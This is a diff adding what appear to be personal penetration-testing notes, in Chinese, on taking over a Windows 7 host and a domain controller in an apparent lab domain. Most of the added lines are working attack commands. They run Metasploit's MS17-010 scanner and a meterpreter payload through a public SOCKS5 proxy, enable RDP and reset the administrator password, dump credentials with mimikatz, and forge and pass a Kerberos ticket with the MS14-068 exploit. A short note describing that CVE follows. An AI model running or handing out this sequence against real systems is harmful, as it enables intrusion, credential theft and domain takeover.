@@ -58,3 +58,34 @@ wget 下载
 sudo apt-get install libqt5webenginewidgets5 libqt5websockets5
 sudo apt-get install nasm mingw-w64 
 yum install libqt5webenginewidgets5 libqt5websockets5
+
+use auxiliary/scanner/smb/smb_ms17_010
+set rhost 192.168.183.129
+setg Proxies socks5:116.62.32.64:36666 
+
+
+拿下win7
+set RhOSTs 192.168.183.129
+setg Proxies socks5:116.62.32.64:36666
+set payload windows/x64/meterpreter/bind_tcp
+set lport 5555
+run
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 打开3389
+net user administrator Admin12345
+net user administrator Admin12345 /active:yes  
+chcp 65001 
+mimikatz.exe
+sekurlsa::logonpasswords
+
+cd \Users\douser\Desktop
+load kiwi
+
+ms14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.131 -p Dotest123
+MS14-068.exe -u douser@DEMO.com -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.131 -p Dotest123
+sekurlsa::logonpasswords
+mimikatz.exe
+kerberos::purge 清空
+kerberos::list
+kerberos::ptc "TGT_douser@DEMO.com.ccache"
+
+MS14-068（CVE-2014-6324） 是 Microsoft Windows 操作系统中的一个高危漏洞,影响 Kerberos 协议的权限验证机制。如果攻击者获取了域内任何一台计算机的shell权限，同时知道任意域用户的用户名、SID、密码，即可获取域管理员权限，未打补丁的 Windows Server 2003 至 2012 R2 域控制器都可能有该漏洞。
